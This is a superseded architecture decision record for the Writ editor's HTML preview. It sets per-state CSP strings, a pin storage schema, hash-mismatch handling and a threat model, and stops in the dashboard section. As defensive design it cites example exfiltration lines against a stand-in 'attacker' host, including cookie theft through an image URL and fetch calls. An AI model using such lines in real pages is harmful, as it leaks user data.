# ADR-011: Preview Trust Model — CSP, Pins, Audit, Verification

**Status:** Superseded — descoped to offline agent-output preview (2026-05-26)
**Date:** 2026-05-22

> **Superseded.** The preview renders Writ's own agent/LLM output offline; it
> is not a safe renderer for hostile web HTML, and network is categorically
> off forever. With no network there is nothing to exfiltrate to, which
> dissolves the trust model this ADR built: no pins, no audit log, no
> content-hash, no per-buffer scripts/network toggles, no trust dashboard.
> The entire apparatus collapses to **one fixed document CSP** plus a single
> app-level "run scripts" kill switch (default on) — scripts make interactive
> agent templates work, `connect-src 'none'` plus image/font/media limited to
> `data:` and the local host-gated `writ-preview:` scheme make exfil
> impossible regardless. The locked document CSP and a focused exfil-denial
> test (remote img/fetch/beacon/websocket/font all blocked) plus the single
> `writ-preview://` URL-parser fuzz target are what survive; the 15-fixture
> corpus, the other fuzz targets, pins, audit, and dashboard are **cut** — not
> deferred. Retained as a record. See the lean re-scope note in ADR-009.

## Context

ADR-009 committed the preview substrate: a per-buffer child Tauri webview
served through a custom `writ-preview://` protocol, split between a
`chrome` scope for bundled trusted assets and a `document` scope for
user-authored content, with per-webview CSP applied programmatically.
ADR-010 commits the workspace primitive: a single rooted directory tree
that scopes the sibling-file allowlist served by `writ-workspace://`, and
that defines the boundary against which trust decisions are taken when a
buffer belongs to one. ADR-009 explicitly defers the actual policy bytes,
the trust persistence model, the verification corpus, and the threat
model to **this ADR**. ADR-010 explicitly defers workspace-aware trust
scoping to this ADR.

Three commitments converge here:

- **The policy bytes.** The CSP strings — every directive, per scope,
  per policy state — that are wired into the webview at create time.
  These cannot be deferred to the implementation PR because they are the
  load-bearing security primitive of the entire epic. If they are wrong
  in one cell of the 2 × 4 matrix, the verification suite is useless.
- **The pin model.** When the user grants a non-default policy to a
  document, where that grant lives, what it is keyed on, and how it is
  invalidated. The pin model is also what makes ADR-010's workspace
  trust boundary expressible — "trust all `*.html` in this workspace"
  is a pin scope decision, not a workspace decision.
- **The verification suite.** Writ's in-house security audit. ADR-009
  is built around the assertion that the protocol handler owns the
  network boundary; that assertion is only as credible as the test
  corpus that proves it. The corpus is enumerated here, committed to
  the same repo, and gates merge on every PR.

The wrong move is to ship the substrate with a hand-waved CSP and the
verification suite as a "follow-up." That is exactly the
ship-first-improve-later trap Writ's quality bar forbids. The substrate
is shipped with policy bytes, the policy bytes are shipped with the
suite that proves them, and the suite is shipped with the threat model
that describes what it defends against. All three land in the same
release.

The right move is to commit, in this ADR, every byte of CSP under every
policy state, every column of the pin storage schema, every event the
audit log can record, every fixture class the verification suite must
cover, and every perf budget the implementation must hit. The ADR is
the contract; the implementation PR is the execution.

This ADR also commits the threat model document path
(`docs/security/html-preview.md`) and the cargo-fuzz target set for the
protocol-handler URL parser. Both are referenced as deliverables of the
implementation PR for this ADR, not as artifacts the ADR itself writes.

## Threat model summary

Full threat model lives at **`docs/security/html-preview.md`** and is
versioned alongside this ADR. It is produced by the implementation PR
for ADR-011, never sent off-device, and is the canonical reference for
the verification suite's assertions. The summary below is the
condensed map; the full document is the source of truth.

### Assets

- **User files** under the workspace root and at arbitrary absolute
  paths opened directly (the buffer corpus).
- **User data** in `~/.config/writ/` (or platform equivalent): config,
  scratch buffers, session state, pin database, audit log.
- **The host machine.** Browser-side primitives that touch the
  filesystem (`<input type=file>`), the clipboard, drag-and-drop, geo,
  microphone, camera, MIDI, USB, Bluetooth. Default policy disables
  every one of these via CSP and permissions-policy.
- **Exfiltration channels.** The space of all egress paths from the
  preview webview to a remote attacker: subresource fetches
  (`<img>`, `<link>`, `<video>`, `<audio>`, `<track>`, `<source>`,
  `srcset`, `picture`, `@font-face`, `@import`), navigation
  (`window.location`, `<meta http-equiv="refresh">`,
  `<a target=_top>`, `window.open`), scripting APIs (`fetch`, `XHR`,
  `EventSource`, `WebSocket`, `navigator.sendBeacon`, `Ping`
  attribute), CSS attribute-selector + `background-image` probes,
  drag-and-drop `DataTransfer`, focus-bound side channels, and
  protocol-handler edge cases (path traversal, double-encoding,
  Unicode normalization, null bytes).

### Adversaries

- **Drive-by HTML file.** The user opens a `.html` file from disk,
  download folder, USB drive, or email attachment. The file is hostile
  but the user's threat model is "I'm just looking." The default policy
  must render this file safely with zero outbound requests under any
  observation.
- **Malicious workspace.** A workspace cloned from an untrusted source
  (a tarball, a Git repo) contains files whose preview is intended to
  exfiltrate workspace contents. Default policy holds; workspace-
  scoped pins are the user's deliberate weakening, gated by the
  confirm dialog and visible in the dashboard.
- **Supply-chain compromised file.** A file the user previously
  trusted (per-file pin) is modified by an attacker with write access
  to the workspace (Git pull, package install, file sync). The
  hash-mismatch banner is the defense; silent invalidation is
  forbidden.

### Attack surface map

- **Substrate (ADR-009).** Per-buffer child webview with per-webview
  CSP and the `writ-preview://` protocol. This ADR commits the CSP
  bytes per scope per state, and the protocol-handler disposition
  logic.
- **Workspace boundary (ADR-010).** The `writ-workspace://` sibling-
  file protocol's allowlist. The protocol handler refuses any
  workspace request that resolves outside the active workspace root
  after canonicalization. The pin scope `WorkspaceExtension` /
  `WorkspaceGlobal` extends trust within this boundary but never
  beyond it.
- **Pin scopes (this ADR).** `File` (absolute path, content-hashed),
  `WorkspaceExtension` (workspace_id + extension, location-based),
  `WorkspaceGlobal` (workspace_id, location-based). The pin record is
  the policy-grant artifact; absence of a pin = default-deny.

### Mitigations

The eight CSP cells, the protocol-handler allowlist, the per-window
state isolation (ADR-009's E3), the hash-mismatch banner, the
non-modal "this file changed" surface, the audit log, the trust
dashboard, the dev-tools-off-in-release rule (ADR-009), the cargo-fuzz
corpus on the URL parser, and the cross-platform CI run of the
verification suite.

### Residual risks

- **Renderer process compromise.** A 0-day in WebKit / WebKit2GTK /
  WebView2 that escapes the CSP entirely. Out of scope; the mitigation
  is OS sandboxing and timely Tauri upgrades. Acknowledged, not
  prevented.
- **OS-level exfil via dev-tools in debug builds.** Addressed by
  ADR-009's `#[cfg(not(debug_assertions))] devtools(false)` rule; a
  debug build is a developer artifact and the dev-tools toggle is a
  layer of defense-in-depth, not the boundary.
- **Side-channel timing attacks** against the host (cross-process
  timing of pin lookups to infer pin presence). Mitigated by
  constant-time lookup paths in the protocol handler where attacker-
  observable; documented in the threat model with the specific call
  sites annotated.
- **User-pinned malicious documents.** If the user pins `ALLOW_BOTH`
  on a malicious document, exfiltration is by definition possible —
  pinning is the act of opting into the risk. Mitigated by the
  confirm dialog's clarity, the audit log, the hash-mismatch banner
  on subsequent loads, and the dashboard's revocation path.

### Verification suite map

Every threat above maps to one or more fixtures in
`src-tauri/tests/preview-security/`, enumerated in the verification
suite section below. Each fixture's docstring names the threat-model
asset and adversary it covers.

## Decision drivers

- **Default-deny is the only acceptable default.** SAFE policy must
  pass every fixture in the verification suite with zero outbound
  requests under any observation. No script execution, no network,
  no remote subresources, no iframes, no form submission, no
  navigation, no plugins. If a fixture leaks anything under default
  policy, the ADR is broken.
- **Two-axis opt-in, not one switch.** Scripts and network are
  independently dangerous and independently useful. A user trusting a
  Mermaid-bearing HTML page wants scripts without network. A user
  previewing a static HTML file with a CDN stylesheet wants network
  without scripts. Coupling them into one "trust" toggle forces the
  user to over-grant. The four-state matrix is the right shape.
- **Persistence is opt-in, distinct from grant.** A session grant
  dies at window close. A pin survives restart. The user must
  consciously choose persistence. Defaulting to "remember" trains
  users to grant trust without thinking; defaulting to "session"
  preserves the option without silently locking it in.
- **Trust is location- or content-keyed, never identity-keyed.**
  Writ has no user accounts, no shared identities, no remote
  authority. A pin is keyed on `(absolute_path, content_hash)` for
  `File` scope, on `(workspace_id, extension)` for
  `WorkspaceExtension`, on `workspace_id` for `WorkspaceGlobal`.
  There is no signing, no certificate, no remote attestation in v1.
- **Silent invalidation is forbidden.** Every trust state change is
  visible (banner, dashboard) and logged (audit table). A file that
  changes hash does not silently drop trust. A user who quits and
  reopens the app does not silently lose a session grant — session
  grants are documented to die at window close, and the audit log
  records the session-expiry event when they do.
- **The audit log is local, append-only, and never sent off-device.**
  Writ has zero telemetry as a brand promise. The audit log is the
  user's local accountability record, not a phone-home channel.
- **Workspace boundaries hold.** Workspace-scoped pins are valid only
  within the workspace they were granted in. Opening the same file
  outside a workspace (or in a different workspace) does not inherit
  a `WorkspaceExtension` / `WorkspaceGlobal` pin from elsewhere. The
  workspace_id is part of the lookup key.
- **The verification suite is the audit.** No third-party pen-test,
  no consulting engagement, no SaaS scanner. The suite is enumerated
  in this ADR, built in-repo by the implementation PR, runs on every
  PR in CI, and gates merge. It is owned by Writ.

## Considered options

This ADR makes seven composite decisions: **A** policy-state shape,
**B** scope split (chrome vs. document) and the CSP per cell, **C**
pin storage shape, **D** hash-mismatch behavior, **E** dashboard
shape, **F** audit log retention and surface, **G** verification
suite layout. Each is named and decided below. Where the option is
forced by ADR-009 / ADR-010, the section says so explicitly.

### A — Policy-state shape

#### A1. Single boolean: `trusted: bool`

One flag. Trusted means scripts and network on; untrusted means
default-deny.

- Cons: Couples scripts and network. Users who want one without the
  other are forced to grant both. Rejected: violates the two-axis
  driver.

#### A2. Four discrete states (SAFE / ALLOW_SCRIPTS / ALLOW_NETWORK / ALLOW_BOTH) + persistence axis

Two independent booleans for the capability axis (`scripts`,
`network`) flattened into four named states; one enum for
persistence (`Session | Pinned`). The state is serializable, the
state machine is exhaustive, the dashboard renders four chip
variants.

- Pros: Matches the natural opt-in shape. Each state is a single
  CSP-builder dispatch. Audit log records the full state on each
  grant. Persistence is orthogonal and clearly visible.
- Cons: A bit more code than A1, but the code is small and the
  enum is exhaustive (`match` enforces every case at compile time).

#### A3. Open-ended capability bag (`HashSet<Capability>`)

A `Capability` enum with variants for every CSP directive (scripts,
fetch, websocket, fonts, images, frames, etc.). The pin stores the
allowed set; the CSP builder consumes the set.

- Cons: The space is too large for the UX to expose meaningfully.
  The user would have to understand `connect-src` vs. `script-src`.
  The four-state model is the right compression of the underlying
  CSP directives. Open-ended capability bags also defeat the
  exhaustive-match safety of the four-state enum and make the audit
  log harder to read. Rejected.

**Chosen: A2.** Four-state enum plus a `persistence` field. The
`PreviewPolicy` struct declared in `writ-core` by ADR-009 expands
here:

```rust
pub enum PreviewPolicy {
    Safe,
    AllowScripts,
    AllowNetwork,
    AllowBoth,
}

pub enum PolicyPersistence {
    Session,
    Pinned,
}

pub struct EffectivePolicy {
    pub policy: PreviewPolicy,
    pub persistence: PolicyPersistence,
    pub source: PolicySource,
}

pub enum PolicySource {
    Default,
    Pin { pin_id: i64, scope: PinScope },
    Session { granted_at: SystemTime },
}
```

The four-state enum is exhaustive at compile time. Adding a fifth
state is a breaking change to every consumer, which is correct — any
expansion of the trust surface is an ADR-level decision.

### B — Scope split and the CSP per cell

ADR-009 commits the chrome-vs-document scope split. This ADR commits
the CSP bytes per scope, per policy state. The matrix is **2 × 4 =
eight CSP cells**.

#### B1. Single CSP, vary `script-src` / `connect-src` only

One CSP template, two directives flip per state. Saves code.

- Cons: Real CSP hardening involves more than two directives. A
  template with two variable directives leaves the rest of the
  CSP at the same default for every state, which means the SAFE
  state and the ALLOW_BOTH state share `img-src`, `font-src`,
  `media-src`, `frame-src`, `object-src`, etc. That is wrong:
  ALLOW_NETWORK should open `img-src` to allow remote images;
  SAFE must not.

#### B2. Per-cell CSP, explicit, no template inheritance

Each of the eight cells is an explicit string in `src-tauri/preview/security/csp.rs`,
produced by a `CspBuilder` function that takes `(scope, policy)` and
returns the full directive list. No template inheritance, no
"defaults"; every directive in every cell is written out. The cells
are exercised individually by the verification suite.

- Pros: Auditability. Every cell is grep-able in source. A
  reviewer comparing two cells does not have to mentally apply a
  delta to a template. Test fixtures assert one fixture per cell.
- Cons: Slightly more code than the template approach (~16 lines
  per cell). Trivial compared to the auditability win.

**Chosen: B2.** Eight cells, explicit. The CSP-builder module
exposes a single function:

```rust
pub fn build_csp(scope: CspScope, policy: PreviewPolicy) -> String;
```

and the eight branches each return a constant-folded string. Unit
tests assert each branch returns the documented byte sequence.

#### Chrome scope CSP

The chrome scope (`writ-preview://chrome/*`) serves bundled trusted
assets: the fallback stylesheet (ADR-009 F2), the Mermaid runtime
(ADR-009 D), the KaTeX runtime, the PDF.js runtime (if PDF preview
ships), and bundled web fonts. **The chrome scope CSP
never opens up to user input regardless of the document-scope
policy state.** Document-scope's `ALLOW_BOTH` does not weaken the
chrome scope; the chrome webview's CSP is independent of the
document webview's CSP.

The chrome scope's CSP is **the same string for all four policy
states**. The policy state does not affect chrome. Why: the chrome
scope is the host's surface — its assets are the host's, its
scripts are the host's. The four policy states are about the user's
opt-in to trusting the *document*; the chrome is trusted by
construction.

```
default-src 'none';
script-src 'self';
style-src 'self';
img-src 'self' data:;
font-src 'self';
connect-src 'self';
media-src 'self';
object-src 'none';
manifest-src 'none';
prefetch-src 'none';
frame-src 'none';
worker-src 'none';
form-action 'none';
base-uri 'self';
frame-ancestors 'none';
navigate-to 'self';
```

Justification of every directive:

- `default-src 'none'`: nothing loads unless an explicit directive
  re-permits it. The "default-deny baseline" CSP idiom.
- `script-src 'self'`: only chrome-bundled scripts (Mermaid runtime,
  KaTeX runtime, PDF.js runtime) execute. No inline scripts, no
  `eval`, no `data:` script URIs. The bundled scripts are
  fingerprint-locked at build time and shipped in the binary.
- `style-src 'self'`: only chrome-bundled CSS. No inline `<style>`
  in chrome documents (chrome documents are static and do not
  need inline styling). No `'unsafe-inline'` for the chrome
  scope; the document scope is the only place inline CSS is
  permitted.
- `img-src 'self' data:`: chrome may use bundled icons and base64
  data URIs for tiny inline glyphs.
- `font-src 'self'`: bundled web fonts (Inter, JetBrains Mono per
  ADR-008) and no others.
- `connect-src 'self'`: the chrome scope's fetch surface is
  internal only. There is no chrome-scoped network egress.
- `media-src 'self'`: chrome may reference bundled audio/video
  (not currently used; reserved).
- `object-src 'none'`: no `<object>` or `<embed>`. Plugin
  embedding is a historical hole.
- `manifest-src 'none'`: no web-app manifest. The preview is not a
  PWA.
- `prefetch-src 'none'`: no resource prefetch. Explicit because
  some browsers prefetch through this directive independent of
  default-src.
- `frame-src 'none'`: no iframes.
- `worker-src 'none'`: no service workers, no shared workers, no
  dedicated workers. The renderers do not need workers in v1; if
  a future renderer (PDF.js heavy path) needs one, this directive
  is revisited in that renderer's ADR.
- `form-action 'none'`: form submissions go nowhere. (Chrome
  forms are not used; defense in depth.)
- `base-uri 'self'`: `<base href>` cannot redirect relative URLs
  off-origin.
- `frame-ancestors 'none'`: the chrome scope cannot be embedded
  by any other origin. Defense against ancestor-embedding attacks
  if the chrome URL is ever leaked.
- `navigate-to 'self'`: top-level navigation is constrained to
  the chrome scope. Defense against `window.location =
  'https://attacker'` from chrome-bundled scripts (which are
  trusted, but defense in depth catches build-time supply-chain
  compromises of the bundled runtime).

#### Document scope CSP — per policy state

The document scope (`writ-preview://document/*`) serves user-
authored content. The CSP changes per policy state.

##### Document × SAFE

```
default-src 'none';
script-src 'none';
style-src 'self' 'unsafe-inline' writ-preview:;
img-src writ-preview: writ-workspace: data:;
font-src writ-preview: writ-workspace:;
connect-src 'none';
media-src 'none';
object-src 'none';
manifest-src 'none';
prefetch-src 'none';
frame-src 'none';
worker-src 'none';
form-action 'none';
base-uri 'none';
frame-ancestors 'none';
navigate-to 'none';
```

- `default-src 'none'`: baseline.
- `script-src 'none'`: no script execution, no inline `<script>`,
  no event handlers (CSP3 blocks event handler attributes when
  `script-src` is set without `'unsafe-inline'`), no `javascript:`
  URLs, no `eval`, no dynamic-code constructor paths. The strongest
  form of script suppression.
- `style-src 'self' 'unsafe-inline' writ-preview:`: the document
  may carry author CSS, inline or `<style>`. `'unsafe-inline'`
  scoped only to the document scope under SAFE is the trade-off
  for letting HTML render with its own styling. The fallback
  stylesheet (`writ-preview://chrome/preview-base.css`) is
  resolved via the `writ-preview:` source (the document scope
  can pull in the chrome scope's stylesheet via the protocol
  handler — the handler enforces that only the documented chrome
  paths resolve). `'unsafe-eval'` is **not** in `style-src`.
- `img-src writ-preview: writ-workspace: data:`: images load from
  the document's own protocol (the document's bytes, served
  inline by the handler), from the workspace's sibling files
  (per ADR-010's `writ-workspace://`), and from `data:` URIs (the
  document can inline images base64-encoded; this is safe because
  `data:` cannot exfiltrate).
- `font-src writ-preview: writ-workspace:`: fonts may load from
  bundled chrome or from workspace siblings. No `data:` fonts —
  data-URI fonts are a known polyglot vector and the use case
  is too narrow to justify the surface.
- `connect-src 'none'`: no `fetch`, no `XMLHttpRequest`, no
  `WebSocket`, no `EventSource`, no `navigator.sendBeacon`. All
  scripting-driven network is blocked. (Scripts themselves are
  also blocked by `script-src 'none'`, so this is belt and
  suspenders.)
- `media-src 'none'`: no `<audio>`, no `<video>`, no `<track>`,
  no `<source>` resolving to remote URLs. SAFE refuses media
  entirely; ALLOW_NETWORK opens it.
- `object-src 'none'`: no `<object>`, no `<embed>`, no plugins.
- `manifest-src 'none'`: no manifest.
- `prefetch-src 'none'`: no link prefetch.
- `frame-src 'none'`: no iframes. The substrate decision in
  ADR-009 makes iframes structurally unnecessary — every
  embedded document gets its own webview, not its own iframe.
- `worker-src 'none'`: no workers.
- `form-action 'none'`: forms submit nowhere. SAFE blocks form
  submissions entirely; ALLOW_NETWORK opens to HTTPS-only.
- `base-uri 'none'`: `<base href>` is disabled. Why: attacker-
  controlled `<base href="https://attacker/">` would rewrite all
  relative URLs in the document to the attacker's origin, which
  defeats every other origin-based protection. `'none'` is the
  only safe value.
- `frame-ancestors 'none'`: the document cannot be embedded by
  any other origin. Defense in depth against clickjacking if a
  future feature ever exposes preview URLs externally (today
  they are not exposed).
- `navigate-to 'none'`: the document cannot navigate the
  preview webview's top frame to any URL. No
  `window.location = 'https://attacker'`, no `<meta refresh>`
  to external origins, no `<a target=_top>` exfil. (Scripts are
  also blocked, so meta-refresh is the only relevant vector;
  CSP `navigate-to` blocks it for non-script paths too.)

##### Document × ALLOW_SCRIPTS

Same as SAFE except:

- `script-src 'self' 'unsafe-inline' 'unsafe-eval' writ-preview:`
  — author scripts permitted. `'unsafe-inline'` permits inline
  `<script>` and event handler attributes. `'unsafe-eval'`
  permits `eval` and dynamic-code constructors; modern frontend
  libraries (small ones an HTML author might include) sometimes
  use them in build output. Scoped only to the document scope,
  not chrome.
- All other directives unchanged: `connect-src 'none'`,
  `media-src 'none'`, `form-action 'none'`, `worker-src 'none'`.
  Scripts run but cannot egress to the network.

The verification suite asserts that under ALLOW_SCRIPTS, a script
that attempts `fetch('https://attacker/')` is blocked by
`connect-src 'none'`; a script that attempts `new Worker(...)` is
blocked by `worker-src 'none'`; a script that attempts
`new Image(); img.src = 'https://attacker/?cookie=' + ...` is
blocked by `img-src` (no `https:` source).

##### Document × ALLOW_NETWORK

Same as SAFE except:

- `connect-src https:` — HTTPS only. No `http:`. No `ws:`. The
  document's scripts (if any were permitted — under ALLOW_NETWORK
  alone, they are not) cannot fetch. The directive is in place
  for the `ALLOW_BOTH` aggregation and as defense in depth for
  CSP-level navigations (`<a>` with `ping` attribute).
- `img-src writ-preview: writ-workspace: data: https:` — HTTPS
  remote images permitted.
- `font-src writ-preview: writ-workspace: https:` — HTTPS remote
  fonts permitted.
- `media-src https:` — HTTPS media permitted.
- `style-src 'self' 'unsafe-inline' writ-preview: https:` — HTTPS
  remote stylesheets permitted via `<link rel=stylesheet>`.
- `form-action https:` — HTTPS form submissions permitted.
- `navigate-to https:` — top-level navigation to HTTPS permitted
  (the user clicked a link).
- All script directives unchanged: `script-src 'none'`. Even with
  network, scripts remain blocked.

The TLS-only constraint is non-negotiable. `http:` is plaintext
exfiltration of whatever the document contains; if the user is
opting into network, they are opting into TLS. The verification
suite includes a fixture that attempts `<img src="http://...">`
under ALLOW_NETWORK and asserts the request is blocked.

##### Document × ALLOW_BOTH

The union of ALLOW_SCRIPTS and ALLOW_NETWORK:

- `script-src 'self' 'unsafe-inline' 'unsafe-eval' writ-preview: https:`
- `connect-src https:`
- `img-src writ-preview: writ-workspace: data: https:`
- `font-src writ-preview: writ-workspace: https:`
- `media-src https:`
- `style-src 'self' 'unsafe-inline' writ-preview: https:`
- `form-action https:`
- `navigate-to https:`
- `worker-src 'self' writ-preview:` — workers permitted; scoped
  to same-origin (the preview protocol). Remote workers stay
  blocked. Justification: modern scripts that use workers
  expect them; the worker source is constrained to the document's
  own origin under the protocol handler, which means the worker
  code came from the document itself (already trusted under
  ALLOW_SCRIPTS).
- `frame-src 'none'`: iframes remain blocked even under
  ALLOW_BOTH. There is no use case for iframes in the preview
  surface; the substrate is per-buffer-webview by design.
- `object-src 'none'`: plugins remain blocked; no path to
  re-enable.
- `base-uri 'none'`: still blocked. `<base href>` redirection of
  relative URLs is a footgun even for trusted documents; if a
  document genuinely needs `<base>`, that is an open question
  for a future ADR and not unlocked by ALLOW_BOTH.
- `frame-ancestors 'none'`: still blocked.

#### CSP cell summary table

| Cell                              | script-src                                                 | connect-src | img-src                                       | media-src | style-src                                      | form-action | navigate-to | worker-src         |
|-----------------------------------|------------------------------------------------------------|-------------|-----------------------------------------------|-----------|------------------------------------------------|-------------|-------------|--------------------|
| Chrome × any                      | `'self'`                                                   | `'self'`    | `'self' data:`                                | `'self'`  | `'self'`                                       | `'none'`    | `'self'`    | `'none'`           |
| Document × SAFE                   | `'none'`                                                   | `'none'`    | `writ-preview: writ-workspace: data:`         | `'none'`  | `'self' 'unsafe-inline' writ-preview:`         | `'none'`    | `'none'`    | `'none'`           |
| Document × ALLOW_SCRIPTS          | `'self' 'unsafe-inline' 'unsafe-eval' writ-preview:`       | `'none'`    | `writ-preview: writ-workspace: data:`         | `'none'`  | `'self' 'unsafe-inline' writ-preview:`         | `'none'`    | `'none'`    | `'none'`           |
| Document × ALLOW_NETWORK          | `'none'`                                                   | `https:`    | `writ-preview: writ-workspace: data: https:`  | `https:`  | `'self' 'unsafe-inline' writ-preview: https:`  | `https:`    | `https:`    | `'none'`           |
| Document × ALLOW_BOTH             | `'self' 'unsafe-inline' 'unsafe-eval' writ-preview: https:`| `https:`    | `writ-preview: writ-workspace: data: https:`  | `https:`  | `'self' 'unsafe-inline' writ-preview: https:`  | `https:`    | `https:`    | `'self' writ-preview:` |

`default-src 'none'`, `object-src 'none'`, `manifest-src 'none'`,
`prefetch-src 'none'`, `frame-src 'none'`, `base-uri 'none'`,
`frame-ancestors 'none'` are constant across all four document
cells. They are listed once in the per-cell text above and asserted
in every cell's unit test.

### C — Pin storage shape

#### C1. Single `policy_overrides` table keyed only by path

One row per file with a `policy` column. No scope discrimination.

- Cons: Cannot express "trust all `*.html` in this workspace."
  Forces per-file pinning even for repositories of trusted
  content. The user fatigue from confirming every file in a
  workspace would push them to ALLOW_BOTH globally, which is
  worse. Rejected.

#### C2. `preview_pins` table with scope discriminator + workspace_id FK

```sql
CREATE TABLE preview_pins (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    scope           TEXT NOT NULL,          -- 'File' | 'WorkspaceExtension' | 'WorkspaceGlobal'
    workspace_id    TEXT REFERENCES workspaces(id) ON DELETE SET NULL,
    path            TEXT,                   -- absolute path, only for scope = 'File'
    extension       TEXT,                   -- e.g. 'html', only for scope = 'WorkspaceExtension'
    policy_json     TEXT NOT NULL,          -- serialized PreviewPolicy
    content_hash    BLOB,                   -- SHA-256, only for scope = 'File'
    created_at      INTEGER NOT NULL,       -- unix ms
    last_used_at    INTEGER,                -- unix ms, updated on every preview open
    revoked_at      INTEGER,                -- unix ms, null = active
    revoke_reason   TEXT                    -- 'user' | 'bulk' | 'hash_reconfirm' | 'orphan' | 'session_expired'
);

CREATE INDEX idx_preview_pins_path ON preview_pins (path) WHERE scope = 'File';
CREATE INDEX idx_preview_pins_workspace ON preview_pins (workspace_id);
CREATE INDEX idx_preview_pins_active ON preview_pins (revoked_at) WHERE revoked_at IS NULL;
CREATE INDEX idx_preview_pins_scope ON preview_pins (scope, workspace_id, extension);
```

The `workspace_id` column stores ADR-010's `WorkspaceId` — a 16-hex
truncation of `blake3(canonicalized_root_path)`. It is TEXT, not
INTEGER, because ADR-010 chose a deterministic content-derived
identifier over an auto-incrementing surrogate key (see the
rationale paragraph below). `ON DELETE SET NULL` handles the
unregister case — ADR-010 unregisters workspaces from the registry
rather than deleting their row outright, but if a future cleanup
ever does delete the row, pins survive as orphans.

- Pros: One table covers all three scopes. The `scope` column is
  the discriminator. Indexes target the lookup paths actually
  exercised: per-path lookup for File scope; per-workspace +
  extension lookup for WorkspaceExtension; per-workspace lookup
  for WorkspaceGlobal. Workspace FK is `ON DELETE SET NULL` so
  orphaned pins survive workspace row deletion (dashboard surfaces
  them under "Orphaned" with a one-click revoke).
- Cons: Slightly denormalized (some columns are scope-dependent,
  nullable for other scopes). Acceptable in SQLite; the alternative
  is three tables and a UNION ALL on every lookup.

#### C3. Three separate tables per scope

`preview_file_pins`, `preview_workspace_ext_pins`,
`preview_workspace_global_pins`. Each has the columns relevant to its
scope only.

- Pros: Schema cleanliness.
- Cons: Every lookup is a UNION ALL across three tables. The
  audit log table would need a polymorphic FK or a discriminator
  anyway. The dashboard query becomes three queries plus client-
  side merge. Rejected.

**Chosen: C2.** One table, discriminated by `scope`, with indexes
targeting the three lookup paths. Pin lookup at preview-open time
goes through a single query that early-returns on the first match
in priority order: File → WorkspaceExtension → WorkspaceGlobal.

### Pin lookup precedence

When a buffer with path `P` is opened for preview inside workspace
`W` (or no workspace if `P` is outside any workspace root):

1. **Exact-path pin** (`scope = 'File' AND path = P AND revoked_at IS NULL`).
   If a row matches, use its policy. The content hash is checked
   against the file's current content; mismatch triggers the
   hash-mismatch banner (see D below) but does **not** silently
   demote to SAFE — the policy is still the pin's policy, the
   banner is shown alongside.
2. **Workspace extension pin** (`scope = 'WorkspaceExtension' AND workspace_id = W AND extension = ext(P) AND revoked_at IS NULL`).
   If a row matches, use its policy. Hash check is not applicable
   (location-based).
3. **Workspace global pin** (`scope = 'WorkspaceGlobal' AND workspace_id = W AND revoked_at IS NULL`).
   If a row matches, use its policy.
4. **Session policy** in per-window store (`preview-store.policies[buffer_id]`).
   If present, use it. Session policies are not in SQLite.
5. **Default SAFE.**

Workspace-scope pins do **not** apply when the buffer is outside
the workspace they were granted in. A `WorkspaceGlobal` pin in
workspace W does not affect a buffer opened from `/tmp` that is
not under W's root.

If a buffer is opened in workspace W but a `File` pin exists from a
time when the buffer was opened outside any workspace, the File
pin still applies (path-based, workspace-agnostic). The audit log
records both the pin used and the active workspace at use time.

### D — Hash-mismatch behavior

#### D1. Silent auto-revoke on hash mismatch

On mismatch, drop the pin and treat as SAFE silently.

- Cons: Violates the "silent invalidation is forbidden" driver.
  The user has no way to learn that a file they trusted has
  changed; they cannot re-confirm or revoke deliberately. Rejected.

#### D2. Hard-modal block on hash mismatch

On mismatch, render a full-page block: "this file has changed,
[Re-confirm] [Revoke]." No preview until decision.

- Cons: Hostile UX. The user just clicked into a file; the act of
  rendering a static document under SAFE policy is itself safe
  (the hash mismatch does not affect SAFE rendering). A full-page
  block over-indexes on the risk.

#### D3. Render under SAFE + non-modal banner

On every preview open of a file with a File-scope pin, recompute
SHA-256 of the current content and compare to the stored hash.

- On **match**: pin's policy applies. Update `last_used_at`.
- On **mismatch**: the preview opens under **DEFAULT SAFE policy**
  (not the pin's policy). The pin is **not auto-revoked** —
  silent revocation is forbidden — but its policy is overridden
  for this load. A non-modal banner appears inside the preview
  pane: `this file changed since you trusted it. [Re-confirm] [Revoke]`.
- Re-confirm opens the same trust dialog used for initial trust.
  On confirm, the hash is updated to the current content; the
  preview reloads with the pin's policy applied.
- Revoke removes the pin (audit-log entry with `revoke_reason = 'hash_reconfirm'`).
- The banner is dismissable for the current preview session but
  not silenceable: closing and reopening the preview shows the
  banner again until the user re-confirms or revokes.

**Chosen: D3.** It is the only option that respects the
silent-invalidation driver while not paralyzing the UX with a
full-page block. The downgrade-to-SAFE behavior is the
conservative middle: the user's prior intent (trust) is recorded
but not honored automatically when the file content changes; their
attention is required.

### D2.5 — Hash computation failure

If hash computation fails (file I/O error, file truncated mid-read,
permission denied), the behavior is **the same as hash mismatch**:
open under SAFE, show the banner with text "could not verify file
content — re-confirm trust?", and log to the audit table with
`source = 'hash_mismatch_reconfirm'` if re-confirmed, or
`source = 'hash_mismatch_revoked'` if revoked. Failing-open to the
pin's policy on hash-compute failure is forbidden — failure must
always degrade safely.

### D3.5 — Performance gating of hash computation

ADR-009 disables live re-render above 1 MB document size. Hash
computation has the same threshold: for documents above 1 MB, the
hash is computed lazily on the first manual render trigger (Cmd+R),
not eagerly on preview open. For documents above 50 MB, no
preview is shown at all (per ADR-009), so the hash check is
moot. Below 1 MB, the hash check is eager and asserted under the
30ms p95 budget.

### E — Trust dashboard shape

The trust dashboard is the user-facing surface for pin management.
It lives in settings at **Settings → Trusted Files**.

#### E1. Flat list

One scrollable list, no grouping. Each row shows scope, path,
policy, dates.

- Cons: For a user with pins across multiple workspaces, the flat
  list collapses workspace context. Bulk operations per workspace
  become a multi-select-and-action ritual. Rejected.

#### E2. Grouped by workspace, with "Outside workspace" as a special header

The dashboard is a sectioned list:

- One section per workspace (workspaces from ADR-010 are the
  headers; section title is the workspace's display name).
- One special section header "Outside workspace" for `File`-scope
  pins on paths that are not under any known workspace root.
- One special section header "Orphaned" for pins whose
  `workspace_id` references a workspace that no longer exists
  (workspace was deleted; the FK was set to NULL).

Each row:

- Path (for File scope), `*.{ext}` glob (for WorkspaceExtension),
  or workspace name (for WorkspaceGlobal).
- A scope label chip: `file`, `extension`, `workspace`.
- Policy chips: `scripts`, `network`, `both`, or `safe`.
- Pinned-at date (relative, e.g. "3 days ago", with tooltip
  showing absolute timestamp).
- Last-used date (relative).
- Hash-status indicator (`File` scope only): green dot if hash
  matched on last open, amber dot if mismatch unresolved, gray
  if never opened since pinning.
- A `Revoke` button per row.

**Affordances:**

